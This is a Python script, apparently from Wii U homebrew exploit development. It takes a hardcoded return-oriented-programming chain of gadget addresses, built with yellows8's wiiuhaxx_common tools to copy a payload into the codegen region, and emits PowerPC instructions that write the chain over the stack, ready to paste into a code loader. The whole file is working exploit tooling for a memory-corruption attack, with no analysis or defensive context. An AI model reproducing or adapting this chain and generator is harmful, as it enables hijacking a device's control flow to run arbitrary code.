# Assemble rop chain into semi-optimized ppc to write over the stack
# ROP chain based on yellows8's wiiuhaxx_common for loading into codegen
# FFFF2222 is a stand in for the payload load address (stored in r7)
# FFFF3333 is a stand in for the payload size (stored in r11)
# place at "found:" in codeloader.s


#This ROP chain was created using:
# ropgen_copycodebin_to_codegen(0x01800000, 0xFFFF2222, 0xFFFF3333)
# ropchain_appendu32(0x01800000)
# in ropchainBuilder.html
ropChain = ['00000000','010204C8', '00000000', '00000000', '00000000', '00000000', '00000000', '0107DD70', '010376C0', '00000000', '00000000', '00000000', '00000000', '01080274', '00000000', '00000000', '00000000', '00000000', '00000000', '010204C8', '00000000', '00000000', '00000000', 'FFFF3333', '00000000', '0107DD70', '01035FC8', '01800000', '00000000', 'FFFF2222', '00000000', '01080274', '00000000', '00000000', '00000000', '00000000', '00000000', '010204C8', '00000000', '00000000', '00000000', '00000000', '00000000', '0107DD70', '010376C0', '00000001', '00000000', '00000000', '00000000', '01080274', '00000000', '00000000', '00000000', '00000000', '00000000', '010204C8', '00000000', '00000000', '00000000', '00000000', '00000000', '0107DD70', '01023F88', '01800000', '00000000', 'FFFF3333', '00000000', '01080274', '00000000', '00000000', '00000000', '00000000', '00000000', '010204C8', '00000000', '00000000', '00000000', '00000000', '00000000', '0107DD70', '010240B0', '01800000', '00000000', 'FFFF3333', '00000000', '01080274', '00000000', '01800000']
ropChainAddresses = []
for i in ropChain:
    if not i in ropChainAddresses:
        ropChainAddresses.append(i)

# Essentially, to avoid reloading the same hardcoded values too many times, load each value to r10 one at a time
# then write it to all the locations it is used for. In some cases it uses r7 or r11 for payload address and size
writeRegister = ''
for address in ropChainAddresses:
    if address == 'FFFF2222':
        writeRegister = 'r7'
    elif address == 'FFFF3333':
        writeRegister = 'r11'
    elif address[:4] == '0000':
        print('li r10, 0x'+address[4:])
        writeRegister = 'r10'
    else:
        print('lis r10, 0x'+address[:4])
        if address[4:] != "0000":
            print('ori r10, r10, 0x'+address[4:])

    last = ropChain.index(address)
    while last != -1:
        print('stw %s, 0x%X(r1)' % (writeRegister, last * 4))
        try:
            last = ropChain.index(address, last+1)
        except ValueError:
            last = -1
